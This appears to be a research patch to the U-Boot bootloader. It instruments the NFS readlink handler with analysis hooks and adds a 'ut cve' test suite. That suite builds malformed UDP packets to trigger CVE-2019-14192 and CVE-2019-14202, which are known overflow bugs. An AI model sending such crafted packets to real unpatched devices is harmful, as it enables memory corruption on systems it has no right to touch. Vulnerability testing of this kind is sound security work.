@@ -1,0 +1,208 @@
+diff --git a/include/test/suites.h b/include/test/suites.h
+index 01bee09..dc31a46 100644
+--- a/include/test/suites.h
++++ b/include/test/suites.h
+@@ -31,5 +31,7 @@ int do_ut_lib(cmd_tbl_t *cmdtp, int flag, int argc, char * const argv[]);
+ int do_ut_overlay(cmd_tbl_t *cmdtp, int flag, int argc, char * const argv[]);
+ int do_ut_time(cmd_tbl_t *cmdtp, int flag, int argc, char * const argv[]);
+ int do_ut_unicode(cmd_tbl_t *cmdtp, int flag, int argc, char * const argv[]);
++int do_ut_cve(cmd_tbl_t *cmdtp, int flag, int argc, char * const argv[]);
+ 
+ #endif /* __TEST_SUITES_H__ */
++
+diff --git a/net/nfs.c b/net/nfs.c
+index d6a7f8e..3d26dfc 100644
+--- a/net/nfs.c
++++ b/net/nfs.c
+@@ -34,6 +34,19 @@
+ #include "nfs.h"
+ #include "bootp.h"
+ 
++void _pinstrio_sink_(void *ptr, int size, char *name)
++{
++}
++
++void _pinstrio_constrained_sink_(void *ptr, int size, char *name, void *constr, int csize)
++{
++}
++
++void _pinstrio_abort_()
++{
++}
++   
++
+ #define HASHES_PER_LINE 65	/* Number of "loading" hashes per line	*/
+ #define NFS_RETRY_COUNT 30
+ #ifndef CONFIG_NFS_TIMEOUT
+@@ -613,6 +626,11 @@ static int nfs_readlink_reply(uchar *pkt, unsigned len)
+ 
+ 	debug("%s\n", __func__);
+ 
++    int oob = len > sizeof(rpc_pkt);
++    unsigned of_size = len - sizeof(rpc_pkt);
++    _pinstrio_sink_(&len, 4, "len");
++    _pinstrio_constrained_sink_(&of_size, sizeof(of_size), "of_wsize", &oob, 4);
++    //_pinstrio_abort_();
+ 	memcpy((unsigned char *)&rpc_pkt, pkt, len);
+ 
+ 	if (ntohl(rpc_pkt.u.reply.id) > rpc_id)
+@@ -914,3 +932,18 @@ void nfs_start(void)
+ 
+ 	nfs_send();
+ }
++
++void nsf_set_state(int s)
++{
++    nfs_state = s;
++}
++
++void nsf_set_handler()
++{
++    net_set_udp_handler(nfs_handler);
++}
++
++void nsf_set_port(int p)
++{
++    nfs_our_port = p;  
++}
+diff --git a/net/nfs.h b/net/nfs.h
+index a377c90..2cb5dd7 100644
+--- a/net/nfs.h
++++ b/net/nfs.h
+@@ -81,6 +81,9 @@ struct rpc_t {
+ } __attribute__((packed));
+ void nfs_start(void);	/* Begin NFS */
+ 
++void nsf_set_state(int s);
++void nsf_set_handler();
++void nsf_set_port(int p);
+ 
+ /**********************************************************************/
+ 
+diff --git a/test/Makefile b/test/Makefile
+index 2fe41f4..ddf7151 100644
+--- a/test/Makefile
++++ b/test/Makefile
+@@ -12,3 +12,4 @@ obj-$(CONFIG_UT_TIME) += time_ut.o
+ obj-$(CONFIG_UT_UNICODE) += unicode_ut.o
+ obj-$(CONFIG_$(SPL_)LOG) += log/
+ obj-$(CONFIG_UNIT_TEST) += lib/
++obj-$(CONFIG_$(SPL_)CMDLINE) += cve.o
+diff --git a/test/cmd_ut.c b/test/cmd_ut.c
+index e3b8950..2d7ac3a 100644
+--- a/test/cmd_ut.c
++++ b/test/cmd_ut.c
+@@ -60,6 +60,7 @@ static cmd_tbl_t cmd_ut_sub[] = {
+ 			 "", ""),
+ 	U_BOOT_CMD_MKENT(bloblist, CONFIG_SYS_MAXARGS, 1, do_ut_bloblist,
+ 			 "", ""),
++    U_BOOT_CMD_MKENT(cve, CONFIG_SYS_MAXARGS, 1, do_ut_cve, "", ""),
+ #endif
+ };
+ 
+@@ -124,6 +125,7 @@ static char ut_help_text[] =
+ 	!defined(CONFIG_SPL_BUILD) && !defined(API_BUILD)
+ 	"ut unicode [test-name] - test Unicode functions\n"
+ #endif
++    "ut cve [test-name] - trigger cves\n"
+ 	;
+ #endif /* CONFIG_SYS_LONGHELP */
+ 
+@@ -131,3 +133,4 @@ U_BOOT_CMD(
+ 	ut, CONFIG_SYS_MAXARGS, 1, do_ut,
+ 	"unit tests", ut_help_text
+ );
++
+diff --git a/test/cve.c b/test/cve.c
+new file mode 100644
+index 0000000..e9b9ad0
+--- /dev/null
++++ b/test/cve.c
+@@ -0,0 +1,87 @@
++#include <common.h>
++#include <console.h>
++#include <test/ut.h>
++#include <test/test.h>
++#include <test/suites.h>
++#include <stdlib.h>
++#include <stdio.h>
++#include <net.h>
++#include "../net/nfs.h"
++
++void _pinstrio_source_(void *ptr, int size, char *tag)
++{
++}
++
++#define CVE_TEST(_name, _flags) UNIT_TEST(_name, _flags, cve_test)
++
++static int cve_test_2019_14192(struct unit_test_state *uts)
++{
++    char *pkt = (char *) calloc(8, 64);
++
++    //ip protocol
++    struct ethernet_hdr *pkt_ = (struct ethernet_hdr *) pkt;
++    pkt_->et_protlen = 8;
++
++    //ip header
++    struct ip_udp_hdr *ip = (struct ip_udp_hdr *) (pkt + ETHER_HDR_SIZE);
++    ip->ip_hl_v = 0x40;
++    ip->ip_p = IPPROTO_UDP;
++    ip->ip_len = 0;
++    unsigned int *dest = (unsigned int *) &ip->ip_dst;
++    *dest = 0xffffffff;
++    
++    //checksum last
++    ip->ip_sum = compute_ip_checksum(ip, IP_HDR_SIZE);
++
++    _pinstrio_source_(pkt + 4 * 8 + 2, 8, "packet:controlled");
++
++    //init nsf state
++    nsf_set_state(7);
++    nsf_set_handler();
++    nsf_set_port(0);
++
++    //go!
++    net_process_received_packet(pkt, 64);
++    return 0;
++}
++CVE_TEST(cve_test_2019_14192, 0);
++
++static int cve_test_2019_14202(struct unit_test_state *uts)
++{
++    char *pkt = (char *) calloc(8, 64);
++
++    //ip protocol
++    struct ethernet_hdr *pkt_ = (struct ethernet_hdr *) pkt;
++    pkt_->et_protlen = 8;
++
++    //ip header
++    struct ip_udp_hdr *ip = (struct ip_udp_hdr *) (pkt + ETHER_HDR_SIZE);
++    ip->ip_hl_v = 0x40;
++    ip->ip_p = IPPROTO_UDP;
++    ip->ip_len = htons(10000);
++    unsigned int *dest = (unsigned int *) &ip->ip_dst;
++    *dest = 0xffffffff;
++    
++    //checksum last
++    ip->ip_sum = compute_ip_checksum(ip, IP_HDR_SIZE);
++
++    _pinstrio_source_(pkt + 4 * 8 + 2, 8, "packet:controlled");
++
++    //init nsf state
++    nsf_set_state(7);
++    nsf_set_handler();
++    nsf_set_port(0);
++
++    //go!
++    net_process_received_packet(pkt, 11000);
++    return 0;
++}
++CVE_TEST(cve_test_2019_14202, 0);
++
++int do_ut_cve(cmd_tbl_t *cmdtp, int flag, int argc, char * const argv[])
++{
++    struct unit_test *tests = ll_entry_start(struct unit_test, cve_test);
++    const int n_ents = ll_entry_count(struct unit_test, cve_test);
++
++    return cmd_ut_category("cve", tests, n_ents, argc, argv);
++}
